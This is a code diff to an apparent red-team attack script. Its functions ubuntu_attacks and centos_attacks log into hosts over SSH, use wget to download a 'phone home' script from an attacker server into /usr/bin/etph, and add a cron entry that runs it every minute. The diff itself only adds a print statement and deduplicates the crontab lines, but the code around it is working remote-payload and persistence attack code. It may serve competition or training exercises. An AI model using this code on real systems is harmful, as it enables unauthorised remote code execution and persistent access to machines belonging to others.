@@ -239,6 +239,7 @@ def ubuntu_attacks(host):
 
      # ez mode /etc/group
     wget_phonehome_cmd = "wget {}/phonehome.py -O /usr/bin/etph".format(server_ip)
+    print(wget_phonehome_cmd)
     log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(wget_phonehome_cmd)
     ssh.prompt()
@@ -266,7 +267,7 @@ def ubuntu_attacks(host):
     log_line(ssh.before.decode('utf8'), host)
     
     ## Chown phone home
-    phonehome_crontab_cmd = r'(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/etph") | crontab -'
+    phonehome_crontab_cmd = r'(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/etph") | sort -u | crontab -'
     log_line("Setting crontab on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(phonehome_crontab_cmd)
     ssh.prompt()
@@ -319,7 +320,7 @@ def centos_attacks(host):
     log_line(ssh.before.decode('utf8'), host)
     
     ## Chown phone home
-    phonehome_crontab_cmd = r'(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/etph") | crontab -'
+    phonehome_crontab_cmd = r'(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/etph") | sort -u | crontab -'
     log_line("Setting crontab on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(phonehome_crontab_cmd) 
     ssh.prompt()
